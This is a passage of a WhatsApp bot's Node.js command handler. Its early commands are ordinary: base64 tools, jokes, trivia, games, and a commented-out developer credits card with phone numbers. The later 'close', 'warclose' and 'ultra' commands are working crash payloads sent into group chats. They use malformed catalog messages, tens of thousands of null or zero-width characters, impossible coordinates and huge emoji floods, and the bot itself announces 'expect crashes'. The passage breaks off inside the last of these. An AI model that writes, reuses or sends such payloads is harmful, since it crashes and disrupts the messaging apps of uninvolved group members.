      break;
    }

    // ── Base64 encode/decode ──────────────────────────────
    case 'base64': {
      if (!text) { await reply(`${prefix}base64 <text>`); break; }
      await reply(`📦 *Base64 Encoded:*\n${Buffer.from(text).toString('base64')}`);
      break;
    }

    case 'unbase64': {
      if (!text) { await reply(`${prefix}unbase64 <base64 string>`); break; }
      try {
        const decoded = Buffer.from(text, 'base64').toString('utf8');
        await reply(`📦 *Decoded:*\n${decoded}`);
      } catch { await reply('❌ Invalid base64 string.'); }
      break;
    }

    // ── Whois / number info ──────────────────────────────
    case 'whois': {
      const t = getTargetJid(m, args);
      if (!t) { await reply(`${prefix}whois @mention`); break; }
      try {
        const ppUrl = await sock.profilePictureUrl(t, 'image').catch(() => null);
        const pp = ppUrl ? ppUrl : 'No profile picture';
        const isOnWa = await sock.onWhatsApp(t).catch(() => []);
        const status = isOnWa?.[0]?.exists ? '✅ On WhatsApp' : '❌ Not on WhatsApp';
        const info = `👤 *+${normNum(t)}*\n\n${status}\nPP: ${pp}`;
        if (ppUrl) await replyImg(ppUrl, info);
        else await reply(info);
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ── Reverse GIF ──────────────────────────────────────
    case 'reversegif': {
      const { qMsg: qMRG, qType: qTRG, qKey: qKRG } = getQuoted(m);
      const gifMsg = m.message?.videoMessage || (qTRG === 'videoMessage' ? qMRG?.videoMessage : null);
      if (!gifMsg) { await reply('Reply to a GIF/video.'); break; }
      await reaction('🔁');
      try {
        const srcKey = m.message?.videoMessage ? m.key : qKRG;
        const buf = await dlMedia({ videoMessage: gifMsg }, srcKey);
        const tmp = `/tmp/rgif_${Date.now()}`;
        fs.writeFileSync(`${tmp}.mp4`, buf);
        await new Promise((res, rej) =>
          exec(`ffmpeg -y -i ${tmp}.mp4 -vf reverse -af areverse ${tmp}_rev.mp4 2>/dev/null`, e => e ? rej(e) : res())
        );
        const revBuf = fs.readFileSync(`${tmp}_rev.mp4`);
        await sock.sendMessage(jid, { video: revBuf, gifPlayback: true, caption: '🔁 Reversed GIF' }, { quoted: qchanel });
        try { fs.unlinkSync(`${tmp}.mp4`); fs.unlinkSync(`${tmp}_rev.mp4`); } catch {}
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ── Animated text sticker (attp) ─────────────────────
    case 'attp': {
      if (!text) { await reply(`${prefix}attp <text>`); break; }
      await reaction('✨');
      try {
        const { data } = await axios.get(
          `https://api.siputzx.my.id/api/sticker/attp?text=${encodeURIComponent(text)}`,
          { responseType: 'arraybuffer', timeout: 15000 }
        );
        const buf = Buffer.from(data);
        await sock.sendMessage(jid, { sticker: buf }, { quoted: qchanel });
      } catch (e) { await reply('❌ attp failed: ' + e.message); }
      break;
    }

    // ── Emoji mixer ─────────────────────────────────────
    case 'emojimix': {
      if (args.length < 2) { await reply(`${prefix}emojimix <emoji1> <emoji2>\nExample: ${prefix}emojimix 😀 🔥`); break; }
      try {
        const e1 = encodeURIComponent(args[0]);
        const e2 = encodeURIComponent(args[1]);
        const url = `https://www.gstatic.com/android/keyboard/emojikitchen/20201001/${e1}/${e1}_${e2}.png`;
        await replyImg(url, `${args[0]} + ${args[1]}`);
      } catch { await reply('❌ Emoji mix not found.'); }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   SCRIPT / REPO – with 2 open buttons
    // ══════════════════════════════════════════════════════
/*
    case 'script':
    case 'repo': {
      await reaction('🔗');
      const upSec = Math.floor(process.uptime());
      const d = Math.floor(upSec / 86400);
      const h = Math.floor((upSec % 86400) / 3600);
      const mn = Math.floor((upSec % 3600) / 60);
      const s = upSec % 60;
      const runtime = `${d}d ${h}h ${mn}m ${s}s`;

      const { generateWAMessageFromContent, prepareWAMessageMedia, proto } = require('blacklord-socket');

      // Try to attach menu image as thumbnail
      const menuImgUrl = c.menuImg || settings.DEFAULT_MENU_IMG;
      let imgField = {};
      if (menuImgUrl) {
        try {
          const imgBuf = await getBuffer(menuImgUrl);
          imgField = await prepareWAMessageMedia({ image: imgBuf }, { upload: sock.waUploadToServer });
        } catch {}
      }

      const repoText = ft(
`╭─ ⌬ 𝗕𝗼𝘁 𝗜𝗻𝗳𝗼 ⌬
│ • Name    : ${c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'}
│ • Owner   : ${kontributor[0] || botNumber}
│ • Version  : ${settings.BOT_VERSION || '1.0'}
│ • Prefix   : ${prefix}
│ • Runtime  : ${runtime}
╰─────────────`, sock);

      const pairUrl    = settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot';
      const channelUrl = settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3';

      try {
        const msg = await generateWAMessageFromContent(jid, {
          ephemeralMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:   proto.Message.InteractiveMessage.Body.fromObject({ text: repoText }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: `© ${settings.CREDITS || 'james'}` }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                  title: c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD',
                  hasMediaAttachment: !!imgField.imageMessage,
                  ...imgField,
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [
                    {
                      name: 'cta_url',
                      buttonParamsJson: JSON.stringify({
                        display_text: '🔗 Pair Bot',
                        url: pairUrl,
                        merchant_url: pairUrl,
                      }),
                    },
                    {
                      name: 'cta_url',
                      buttonParamsJson: JSON.stringify({
                        display_text: '📢 Follow Channel',
                        url: channelUrl,
                        merchant_url: channelUrl,
                      }),
                    },
                  ],
                }),
                contextInfo: {},
              }),
            },
          },
        }, { quoted: qchanel });
        await sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
      } catch {
        // Fallback to plain reply if interactive fails
        await reply(repoText + `\n\n🔗 Pair: ${pairUrl}\n📢 Channel: ${channelUrl}`);
      }
      break;
    }*/

    case 'idch':
    case 'cekidch': {
      const chLink = args[0];
      if (!chLink) { await reply(`Usage: ${prefix}idch <channel link>`); break; }
      if (!chLink.includes('https://whatsapp.com/channel/')) {
        await reply('❌ Must be a valid WhatsApp channel link');
        break;
      }
      try {
        const inviteCode = chLink.split('https://whatsapp.com/channel/')[1];
        const res = await sock.newsletterMetadata('invite', inviteCode);
        const verified = res.verification === 'VERIFIED' ? 'Yes ✅' : 'No ❌';
        const teks = ft(
`📢 *Channel Info*

🆔 ID: ${res.id}
📛 Name: ${res.name}
👥 Followers: ${res.subscribers}
🔘 Status: ${res.state}
✅ Verified: ${verified}`, sock);

        const { generateWAMessageFromContent, proto } = require('blacklord-socket');
        const msg = await generateWAMessageFromContent(jid, {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:   proto.Message.InteractiveMessage.Body.fromObject({ text: teks }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: 'by 𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD' }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                  buttons: [{
                    name: 'cta_copy',
                    buttonParamsJson: JSON.stringify({ display_text: 'Copy ID', copy_code: res.id }),
                  }],
                }),
              }),
            },
          },
        }, { quoted: qchanel });
        await sock.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
      } catch (e) { await reply('❌ ' + e.message); }
      break;
    }

    // ══════════════════════════════════════════════════════
    //   FUN – EXISTING
    // ══════════════════════════════════════════════════════

    case 'joke': {
      try { const r = await axios.get('https://official-joke-api.appspot.com/random_joke',{timeout:6000}); await reply(`😂 ${r.data.setup}\n\n${r.data.punchline}`); }
      catch { await reply('❌ No jokes.'); }
      break;
    }
    case 'fact': {
      try { const r = await axios.get('https://uselessfacts.jsph.pl/random.json?language=en',{timeout:6000}); await reply(`💡 ${r.data.text}`); }
      catch { await reply('❌ No facts.'); }
      break;
    }
    case 'quote': {
      try { const r = await axios.get('https://zenquotes.io/api/random',{timeout:6000}); await reply(`🌟 "${r.data[0].q}"\n– ${r.data[0].a}`); }
      catch { await reply('❌ No quotes.'); }
      break;
    }
    case 'dare': {
      const d=['Tell your most embarrassing secret.','Do 20 push-ups now.','Text your crush right now.','Sing a song aloud.','Change your status to something silly for 1hr.','Send a voice note of you barking.','Do your best celebrity impression.'];
      await reply(`🔥 Dare: ${d[Math.floor(Math.random()*d.length)]}`);
      break;
    }
    case 'truth': {
      const t2=['Whats your biggest regret?','Have you ever lied to your best friend?','What is your guilty pleasure?','Who is your secret crush?','What embarrassing thing have you done?','What is a secret you have never told anyone?','Who do you secretly dislike in this group?'];
      await reply(`💬 Truth: ${t2[Math.floor(Math.random()*t2.length)]}`);
      break;
    }
    case 'riddle': {
      const r=[{q:'What has keys but no locks?',a:'A keyboard'},{q:'What gets wetter as it dries?',a:'A towel'},{q:'I speak without a mouth. What am I?',a:'An echo'},{q:'The more you take the more you leave behind.',a:'Footsteps'},{q:'What has hands but cant clap?',a:'A clock'},{q:'I have cities, but no houses live there.',a:'A map'}];
      const pick=r[Math.floor(Math.random()*r.length)];
      await reply(`🧩 *Riddle:* ${pick.q}\n\n_Answer: ${pick.a}_`);
      break;
    }
    case 'roast': {
      const r=['You are the human equivalent of a participation trophy.','If brains were gas, you would not have enough to power an ants motorcycle.','You are not stupid; you just have bad luck thinking.','You bring everyone so much joy when you leave the room.','You are proof that evolution can go in reverse.'];
      const t2=getTargetJid(m,args); const name=t2?`@${normNum(t2)}`:'you'; const mentions=t2?[t2]:[];
      await sock.sendMessage(jid,{text:ft(`🔥 ${r[Math.floor(Math.random()*r.length)].replace('You',name)}`,sock),mentions},{quoted:qchanel});
      break;
    }
    case 'ship': {
      const t1=sender; const t2=getTargetJid(m,args);
      const pct=Math.floor(Math.random()*101); const bar='█'.repeat(Math.floor(pct/10))+'░'.repeat(10-Math.floor(pct/10));
      await reply(`💘 Ship Meter\n\n@${normNum(t1)} ❤️ ${t2?'@'+normNum(t2):'???'}\n\n[${bar}] ${pct}%`);
      break;
    }
    case 'coinflip': { await reply(`🪙 ${Math.random()>0.5?'Heads!':'Tails!'}`); break; }
    case 'dice': { const sides=parseInt(args[0])||6; await reply(`🎲 d${sides}: *${Math.floor(Math.random()*sides)+1}*`); break; }
    case 'magic8': {
      const a=['Yes, definitely!','Without a doubt.','Outlook good.','My sources say no.','Cannot predict now.','Don\'t count on it.','Signs point to yes.','Very doubtful.','It is certain.','Ask again later.'];
      await reply(`🎱 ${a[Math.floor(Math.random()*a.length)]}`);
      break;
    }
    case 'horoscope': {
      const signs=['aries','taurus','gemini','cancer','leo','virgo','libra','scorpio','sagittarius','capricorn','aquarius','pisces'];
      const sign=args[0]?.toLowerCase();
      if(!signs.includes(sign)){await reply(`${prefix}horoscope <sign>\nSigns: ${signs.join(', ')}`);break;}
      try{const r=await axios.post(`https://aztro.sameerkumar.website/?sign=${sign}&day=today`,{},{timeout:8000});await reply(`⭐ *${sign.toUpperCase()}*\n\n${r.data.description}\n\n🍀 Lucky # ${r.data.lucky_number}\n💜 Mood: ${r.data.mood}`);}
      catch{await reply('❌ Failed.');}
      break;
    }
    case 'meme': {
      try{const r=await axios.get('https://meme-api.com/gimme',{timeout:8000});await replyImg(r.data.url,`😂 ${r.data.title}`);}
      catch{await reply('❌ No memes.');}
      break;
    }
    case 'cat': {
      try{const r=await axios.get('https://api.thecatapi.com/v1/images/search',{timeout:8000});await replyImg(r.data[0].url,'🐱 Meow!');}
      catch{await reply('❌ No cats.');}
      break;
    }
    case 'dog': {
      try{const r=await axios.get('https://dog.ceo/api/breeds/image/random',{timeout:8000});await replyImg(r.data.message,'🐶 Woof!');}
      catch{await reply('❌ No dogs.');}
      break;
    }
    case 'waifu': {
      try{const r=await axios.get('https://api.waifu.pics/sfw/waifu',{timeout:8000});await replyImg(r.data.url,'🌸 Waifu!');}
      catch{await reply('❌ No waifu.');}
      break;
    }
    case 'anime': {
      try{const r=await axios.get('https://api.jikan.moe/v4/random/anime',{timeout:8000});const a=r.data.data;await replyImg(a.images?.jpg?.image_url,`🎌 *${a.title}*\nEpisodes: ${a.episodes||'?'}\nScore: ${a.score||'?'}\n${(a.synopsis||'').slice(0,200)}`);}
      catch{await reply('❌ Failed.');}
      break;
    }
    case 'trivia': {
      try{
        const r=await axios.get('https://opentdb.com/api.php?amount=1&type=multiple',{timeout:8000});
        const q=r.data.results[0];
        const ans=[...q.incorrect_answers,q.correct_answer].sort(()=>Math.random()-0.5);
        await reply(`❓ *${q.question.replace(/&quot;/g,'"').replace(/&#039;/g,"'")}*\n\n${ans.map((a,i)=>`${i+1}. ${a}`).join('\n')}\n\n_Answer: ${q.correct_answer}_`);
      }catch{await reply('❌ No trivia.');}
      break;
    }
    case 'compliment': {
      const c2=['You are absolutely brilliant!','Your smile brightens everyone\'s day.','You are stronger than you think.','Your kindness is rare and beautiful.','You make the world a better place!','You have an amazing energy!'];
      const t2=getTargetJid(m,args); const name=t2?`@${normNum(t2)}`:'you'; const mentions=t2?[t2]:[];
      await sock.sendMessage(jid,{text:ft(`💐 ${c2[Math.floor(Math.random()*c2.length)].replace('You',name)}`,sock),mentions},{quoted:qchanel});
      break;
    }
    case 'bored': {
      try{const r=await axios.get('https://www.boredapi.com/api/activity/',{timeout:6000});await reply(`🎯 ${r.data.activity}\nType: ${r.data.type} | Participants: ${r.data.participants}`);}
      catch{await reply('❌ Failed.');}
      break;
    }

    // ── NEW FUN COMMANDS ──────────────────────────────────

    // Rock Paper Scissors
    case 'rps': {
      const choices = ['🪨 Rock','📄 Paper','✂️ Scissors'];
      const valid = ['rock','paper','scissors','r','p','s'];
      const map = {r:'rock',p:'paper',s:'scissors'};
      const raw = args[0]?.toLowerCase();
      const pick = map[raw] || raw;
      if (!['rock','paper','scissors'].includes(pick)) {
        await reply(`${prefix}rps rock/paper/scissors`); break;
      }
      const botPick = ['rock','paper','scissors'][Math.floor(Math.random()*3)];
      const wins = {rock:'scissors',paper:'rock',scissors:'paper'};
      const result = pick === botPick ? '🤝 Draw!' : wins[pick] === botPick ? '🏆 You win!' : '😈 Bot wins!';
      await reply(`Your choice: ${pick}\nBot choice: ${botPick}\n\n${result}`);
      break;
    }

    // Math quiz
    case 'math': {
      const ops = ['+','-','×'];
      const op = ops[Math.floor(Math.random()*ops.length)];
      const a2 = Math.floor(Math.random()*50)+1;
      const b2 = Math.floor(Math.random()*50)+1;
      const ans2 = op==='+' ? a2+b2 : op==='-' ? a2-b2 : a2*b2;
      if (!text) {
        const mathQ = readJSON(DB('mathq.json'), {});
        mathQ[jid] = { ans: ans2, ts: Date.now() };
        writeJSON(DB('mathq.json'), mathQ);
        await reply(`🧮 Quick Math!\n\n*${a2} ${op} ${b2} = ?*\n\nReply with the answer (30s to answer)`);
        break;
      }
      // Check answer
      const mathQ = readJSON(DB('mathq.json'), {});
      const q2 = mathQ[jid];
      if (!q2 || Date.now() - q2.ts > 30000) { await reply('❌ No active math question or time expired.'); break; }
      const userAns = parseInt(text.trim());
      if (userAns === q2.ans) {
        delete mathQ[jid];
        writeJSON(DB('mathq.json'), mathQ);
        await reply(`✅ Correct! The answer was *${q2.ans}* 🎉`);
      } else {
        await reply(`❌ Wrong! The correct answer was *${q2.ans}*`);
      }
      break;
    }

    // Never have I ever
    case 'neverhaveiever': {
      const nhi=[
        'Never have I ever lied to get out of trouble.',
        'Never have I ever eaten food off the floor.',
        'Never have I ever googled myself.',
        'Never have I ever faked being sick.',
        'Never have I ever cried at a movie.',
        'Never have I ever broken a bone.',
        'Never have I ever stayed awake for 24+ hours.',
      ];
      await reply(`🙈 ${nhi[Math.floor(Math.random()*nhi.length)]}\n\n_React 🖐 if you HAVE, 👇 if you HAVEN'T_`);
      break;
    }

    // Would you rather
    case 'wouldyourather': {
      const wyr=[
        ['be able to fly','be invisible'],
        ['speak every language','play every instrument'],
        ['have no internet for a month','no phone for a month'],
        ['always be hot','always be cold'],
        ['know the future','change the past'],
        ['be famous for a day','be unknown forever'],
      ];
      const pick2 = wyr[Math.floor(Math.random()*wyr.length)];
      await reply(`🤔 *Would you rather...*\n\n🅰️ ${pick2[0]}\n\n— OR —\n\n🅱️ ${pick2[1]}\n\n_Reply A or B!_`);
      break;
    }

    // ══════════════════════════════════════════════════════
    //   CREDITS – multi-card developer carousel
    // ══════════════════════════════════════════════════════
   /* case 'credits':
    case 'tennor': {
      await reaction('🌟');
      try {
        const {
          generateWAMessageFromContent,
          prepareWAMessageMedia,
          proto,
        } = require('blacklord-socket');

        // ── Helper: download + upload image for a card header ──
        const makeImgField = async (url) => {
          try {
            const buf = await getBuffer(url);
            return await prepareWAMessageMedia({ image: buf }, { upload: sock.waUploadToServer });
          } catch { return {}; }
        };

        // ── Card definitions ──
        // Each card: { img, title, body, buttons[] }
        const cardDefs = [
          {
            img:   'https://files.catbox.moe/ocgi20.jpg',
            title: '𝗚𝗶𝗱𝗱𝘆 𝗧𝗲𝗻𝗻𝗼𝗿',
            body: [
              '• horny dev',
              '• married',
              '• rude',
              '• arrested for being sexy',
              '• JavaScript coder',
              '• efootball player',
              '• chelsea fan',
              '• UoN student',
              '• Proud Luo',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp',    url: 'https://wa.me/254756182478' },
              { display_text: '✈️ Telegram',    url: 'https://t.me/tennormodzdev' },
              { display_text: '📢 TG Channel',  url: 'https://t.me/+jh4yhoD_XQs2MThk' },
              { display_text: '📣 WA Channel',  url: 'https://whatsapp.com/channel/0029VbAWe2uIHphDEiz3Vh2r' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: '𝗝𝗮𝗺𝗲𝘀 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹',
            body: [
              '• fullstack developer',
              '• anime creator',
              '• proud Kikuyu',
              '• Naxeex games player',
              '• mini militia player',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp',   url: `https://wa.me/${kontributor[0] || settings.SUDO_NUMBER || '254704955033'}` },
              { display_text: '✈️ Telegram',   url: 'https://t.me/shenxidev' },
              { display_text: '📢 TG Channel', url: 'https://t.me/jamesBotz3' },
              { display_text: '👥 TG Group',   url: 'https://t.me/shenqidi' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: '𝗔𝗻𝗶𝗺𝗲 𝗠𝗗 𝗕𝗼𝘁',
            body: [
              `• Powered by blacklord-socket`,
              `• Version: ${settings.BOT_VERSION || '1.0'}`,
              `• Prefix: ${prefix}`,
              `• Library: Node.js`,
              `• Company: ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}`,
              `• Made with ❤️ by the team`,
            ].join('\n'),
            buttons: [
              { display_text: '🔗 Pair Bot',      url: settings.REQUIRED_PAIR_LINK    || 'https://t.me/animemdoff_bot' },
              { display_text: '📢 Follow Channel', url: settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3' },
              { display_text: '👥 Support Group',  url: settings.REQUIRED_GROUP_LINK   || 'https://t.me/shenqidi' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: '*ᴜɴᴋɴᴏᴡɴ ᴅᴇᴠ* ',
            body: [
              '• ғᴏᴜɴᴅᴇʀ ᴏғ ᴢᴇɴᴛʀɪx ᴛᴇᴄʜ',
              '• ʙᴀʀᴄᴀ ғᴀɴ',
              '• ʙᴏᴛ ᴅᴇᴠ',
              '• ᴄᴜᴛᴇsᴛ 😂😂',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp', url: 'https://wa.me/2349057467015' },
              { display_text: '✈️ Telegram', url: 't.me/UNKNOWN_IS_NO_MORE' },
         { display_text: '✈️ Whatsapp channel', url: 'https://whatsapp.com/channel/0029VbCjCq80LKZ4i4iWHq22' },
            ],
          },
{
            img:   'https://i.imghippo.com/files/BFi4775wA.jpg',
            title: '𝐌ꝛ 𝐍𝚯𝐗 𝚸𝚪𝚰𝚳𝚵𝚵𝚵 𝚯𝐅𝐅𝚰𝐂𝐈𝚫𝐋',
            body: [
              '• NOX HOSTING ☁️ | founder',
              '• PRIMEEE TECH | owner',
              '• BOT/SITE WEB developer',
              '• JUST A CHILL BOY 💳',
            ].join('\n'),
            buttons:  [
              { display_text: 'FREEPANEL BOT', url: 'https://t.me/NoxFreepanelbot?start=ref_7083149358' },
              { display_text: 'CHANNEL', url: 'https://whatsapp.com/channel/0029VbAHTYE7oQhXHhEVrS47' },
            
            { display_text: ' WhatsApp CONTACT', url: 'https://wa.me/message/L3752HTRQ3YPI1' },
              { display_text: '✈️ TG-CONTACT', url: 'https://t.me/noxdm' },
            ],
          },
          {
            img:   'https://files.catbox.moe/ee0lj9.jpg',
            title: 'Mzazi Tech Inc',
            body: [
              '• Next.js pro',
              '• Mzazi Nameless bot owner',
              '• proud Kisii',
              '• Single But married',
              '• Bugger mkisii',
            ].join('\n'),
            buttons: [
              { display_text: '📱 WhatsApp',   url: `https://wa.me/${kontributor[0] || settings.SUDO_NUMBER || '254750611309'}` },
              { display_text: '✈️ Telegram',   url: 'https://t.me/shenxidev' },
              { display_text: '📢 TG Channel', url: 'https://t.me/jamesBotz3' },
              { display_text: '👥 TG Group',   url: 'https://t.me/mzazidev' },
            ],
          },
          
        ];

        // ── Build all card image fields in parallel ──
        const imgFields = await Promise.all(cardDefs.map(cd => makeImgField(cd.img)));

        // ── Build proto cards ──
        const cards = cardDefs.map((cd, i) => ({
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: cd.title,
            hasMediaAttachment: !!imgFields[i]?.imageMessage,
            ...(imgFields[i] || {}),
          }),
          body: proto.Message.InteractiveMessage.Body.fromObject({ text: cd.body }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: cd.buttons.map(b => ({
              name: 'cta_url',
              buttonParamsJson: JSON.stringify({ display_text: b.display_text, url: b.url, merchant_url: b.url }),
            })),
          }),
        }));

        const creditMsg = await generateWAMessageFromContent(jid, {
          ephemeralMessage: {
            message: {
              messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
              interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                body:    proto.Message.InteractiveMessage.Body.fromObject({ text: ` *${c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'} — Developer Credits*` }),
                footer:  proto.Message.InteractiveMessage.Footer.fromObject({ text: `© ${settings.CREDITS || 'james'} • ${settings.COMPANY || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 Projects'}` }),
                header:  proto.Message.InteractiveMessage.Header.fromObject({ title: '', hasMediaAttachment: false }),
                contextInfo: {},
                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards }),
              }),
            },
          },
        }, { quoted: qchanel });

        await sock.relayMessage(jid, creditMsg.message, { messageId: creditMsg.key.id });
      } catch (e) {
        // plain fallback
        await reply(
          `🌟 *${c.botName || settings.BOT_NAME || '𝑱𝑨𝑳𝑰𝑨 × 𝑫𝑰𝑬𝑮𝑶 MD'} — Credits*\n\n` +
          `👨‍💻 *Giddy Tennor* — JavaScript dev, UoN student, Proud Luo\n` +
          `👨‍💻 *James Official* — Fullstack dev, anime creator, Proud Kikuyu\n\n` +
          `📢 Channel: ${settings.REQUIRED_CHANNEL_LINK || 'https://t.me/jamesBotz3'}\n` +
          `🔗 Pair: ${settings.REQUIRED_PAIR_LINK || 'https://t.me/animemdoff_bot'}`
        );
      }
      break;
    }
*/
case 'forclose':
case 'close': {
  if (needOwner()) break;
  if (needGroup()) break;
  // Bot admin not strictly required but recommended
  
  await reaction('🔒');
  await reply('⏳ Launching Close payload...');

  try {
    const groupId = jid; // target group JID

    // ── Payload exactly as provided ──
    const closeMessage = {
      senderKeyDistributionMessage: {
        groupId: groupId,
        axolotlSenderKeyDistributionMessage: crypto.randomBytes(32)
      },
      interactiveMessage: {
        body: { text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆" },
        nativeFlowMessage: {
          buttons: [{
            name: "catalog_message",
            buttonParamsJson: "{}"
          }],
          messageParamsJson: "{}"
        }
      }
    };

    // Send with the biz additional node
    await sock.relayMessage(groupId, closeMessage, {
      additionalNodes: [{
        tag: 'biz',
        attrs: { native_flow_name: 'catalog_message' }
      }]
    });

    console.log(`[Close] Payload sent to ${groupId}`);
    await reply('✅ Close payload delivered.');

  } catch (e) {
    console.error('[Close] ERROR:', e);
    await reply(`❌ Close failed: ${e.message || e}`);
  }
  break;
}
// ── WhatsApp crash payload (forclose / close) ──
case 'warclose':
case 'wc': {
  if (needOwner()) break;
  if (needGroup()) break;


  await reaction('🐉');
  await reply('⏳ Launching SAMSUNG WARCLOSE payload...');

  try {
    const target = jid;

    const warclosePayload = {
      interactiveMessage: {
        header: {
          title: "0",
          subtitle: "0",
          hasMediaAttachment: true,
          locationMessage: {
            degreesLatitude: -6.200000,
            degreesLongitude: 106.816666,
            name: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂 ⿻ 𝐈𝐍‌𝐕𝚫𝐒𝐈‌𝚯𝚴 ⿻",
            address: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 Premium",
            jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64'),
          },
        },
        body: {
          text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐗𝐌𝐃",
        },
        footer: {
          text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 | Premium XMD",
        },
        nativeFlowMessage: {
          buttons: [
            { name: 'catalog_message', buttonParamsJson: JSON.stringify({}) },
            { name: 'booking_status', buttonParamsJson: JSON.stringify({}) },
            { name: 'review_and_pay', buttonParamsJson: `{}` },
            { name: 'payment_requested', buttonParamsJson: `{}` },
          ],
          messageParamsJson: '{}',
        },
      },
    };

    await sock.relayMessage(target, warclosePayload, {
      additionalNodes: [{
        tag: 'biz',
        attrs: { native_flow_name: 'catalog_message' }
      }]
    });

    console.log(`[WARCLOSE] Payload sent to ${target}`);
    await reply('✅ SAMSUNG WARCLOSE delivered – expect crashes.');

  } catch (e) {
    console.error('[WARCLOSE] ERROR:', e);
    await reply(`❌ WARCLOSE failed: ${e.message || e}`);
  }
  break;
}
case 'ultra': {
  if (needOwner()) break;
  if (needGroup()) break;


  await reaction('🔥');
  await reply('⏳ Launching SAMSUNG ULTRA payload...');

  try {
    const pJids = participants.map(p => p.id || p.jid).filter(Boolean);
    const target = jid;

    // ── HEAVY CATALOG (20k products) ──
    const PRODUCT_COUNT = 20000;
    const REPEAT_TITLE = 50000;
    const REPEAT_DESC = 300000;
    const REPEAT_NAME = 20000;
    const REPEAT_IMAGE = 50000;

    const catalogPayload = {
      interactiveMessage: {
        header: {
          title: "0",
          subtitle: "0",
          hasMediaAttachment: true,
          locationMessage: {
            degreesLatitude: -6.200000,
            degreesLongitude: 106.816666,
            name: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐎𝐅𝐅𝐂 ⿻ 𝐔𝐋𝐓𝐑𝐀 ⿻",
            address: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 XMD",
            jpegThumbnail: Buffer.alloc(10000, 'a').toString('base64'),
          },
        },
        body: { text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𝐗𝐌𝐃" },
        footer: { text: "𝐒Λ𝐌𝐒𝐔𝐍𝐆 | Ultimate Power" },
        nativeFlowMessage: {
          buttons: [
            {
              name: "catalog_message",
              buttonParamsJson: JSON.stringify({
                title: "\u0111\u0115\u0114\u0117".repeat(REPEAT_TITLE),
                description: "\u0000".repeat(REPEAT_DESC),
                products: Array.from({ length: PRODUCT_COUNT }, (_, i) => ({
                  id: "prod_" + i,
                  name: "\u0111".repeat(REPEAT_NAME),
                  price: "Ksh 999.999",
                  currency: "Ksh",
                  image_url: "https://t.me/SAMSUNG_OFFICIAL" + "\u0000".repeat(REPEAT_IMAGE)
                })),
                catalog_id: "\u0111\u0115\u0114\u0117".repeat(REPEAT_TITLE)
              })
            },
            { name: 'booking_status', buttonParamsJson: '{}' },
            { name: 'review_and_pay', buttonParamsJson: '{}' },
            { name: 'payment_requested', buttonParamsJson: '{}' },
          ],
          messageParamsJson: '{}',
        },
        contextInfo: { mentionedJid: pJids }
      }
    };

    // ── SECONDARY LOCATION BOMB ──
    const locationBomb = {
      locationMessage: {
        degreesLatitude: 9999999999999,
        degreesLongitude: 9999999999999,
        name: "𝐒Λ𝐌𝐒𝐔𝐍𝐆".repeat(20000),
        address: "\u0000".repeat(50000),
        url: "https://t.me/SAMSUNG_OFFICIAL",
        contextInfo: {
          remoteJid: "\u200b".repeat(90000),
          participant: sock.user.id,
          mentionedJid: ["𝐒Λ𝐌𝐒𝐔𝐍𝐆", "Ultra", ...pJids]
        }
      }
    };

    // ── EMOJI SPAM ──
    const emojiBomb = {
      text: "🔥".repeat(200000),
      contextInfo: { mentionedJid: pJids }
    };

    // Send catalog (with biz node)
    await sock.relayMessage(target, catalogPayload, {
      additionalNodes: [{ tag: 'biz', attrs: { native_flow_name: 'catalog_message' } }]
    });
    await new Promise(r => setTimeout(r, 3000));

    // Send location
    await sock.relayMessage(target, locationBomb, {});
    await new Promise(r => setTimeout(r, 3000));

    // Send emoji
